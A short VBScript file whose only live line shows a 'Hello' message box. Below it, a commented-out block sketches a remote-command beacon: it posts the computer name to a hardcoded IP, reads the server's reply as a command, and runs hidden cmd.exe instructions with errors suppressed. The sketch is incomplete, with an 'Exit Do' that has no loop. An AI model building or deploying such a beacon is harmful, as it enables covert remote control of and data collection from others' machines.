MsgBox "Hello", 48
' Option Explicit
' Dim objShell, objFSO, objHTTP, command

' ' Configuration
' Dim hostIP, port, serverURL
' hostIP = "10.40.3.40"  ' Replace with your host PC's IP address
' port = "5000"
' serverURL = "http://" & hostIP & ":" & port

' Set objShell = CreateObject("WScript.Shell")
' Set objHTTP = CreateObject("Microsoft.XMLHTTP")

'     ' Send request to the server
'     On Error Resume Next
'     objHTTP.Open "POST", serverURL, False
'     objHTTP.Send "{""status"": ""connected"", ""hostname"": """ & objShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & """}"
    
'     ' Check for response
'     If objHTTP.Status = 200 Then
'         command = objHTTP.ResponseText
        
'         ' Parse and execute commands (only simple commands here for safety)
'         If command = "list" Then
'             objShell.Run "cmd.exe /c dir > C:\Temp\output.txt", 0, True  ' Example command to list directory contents
'         ElseIf command = "exit" Then
'             Exit Do  ' Stop the loop
'         End If
'     End If
    
'     ' Wait before the next check


' ' Clean up
' Set objShell = Nothing
' Set objHTTP = Nothing
